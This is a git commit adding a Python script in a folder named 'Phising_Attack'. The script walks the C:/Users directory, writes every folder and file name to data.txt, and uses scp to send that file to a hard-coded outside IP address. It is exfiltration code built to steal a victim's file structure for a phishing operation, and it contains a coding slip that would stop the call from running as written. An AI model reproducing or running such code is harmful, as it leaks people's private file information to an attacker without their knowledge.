e036ece164452a55a73829cf6d7c2c7ff48a419c
Aditya-K-Pathak <adityapathak2874@ggmail.com>
2023-10-13 11:43:48 +0530

    0.0.1.0

---
+++ Phising_Attack/main.py
@@ -0,0 +1,33 @@
+import os
+
+class List_Folder:
+    def __init__(self):
+        pass
+
+    def List(root_dir):
+        file_structure = {}
+        
+        for foldername, subfolders, filenames in os.walk(root_dir):
+            relative_path = os.path.relpath(foldername, root_dir)
+            parent_folder = os.path.dirname(relative_path)
+            folder_name = os.path.basename(relative_path)
+            
+            if parent_folder not in file_structure:
+                file_structure[parent_folder] = []
+            
+            file_structure[parent_folder].append({
+                folder_name: filenames
+            })
+        
+        return file_structure
+
+# Specify the root directory to start traversal from
+root_directory = 'C:/Users'
+
+data = str(List_Folder().List(root_directory))
+with open("data.txt", "w") as file:
+    file.write(data)
+try:
+    os.system("scp -i key.pem data.txt ubuntu@54.242.78.59:")
+except:
+    raise ConnectionError
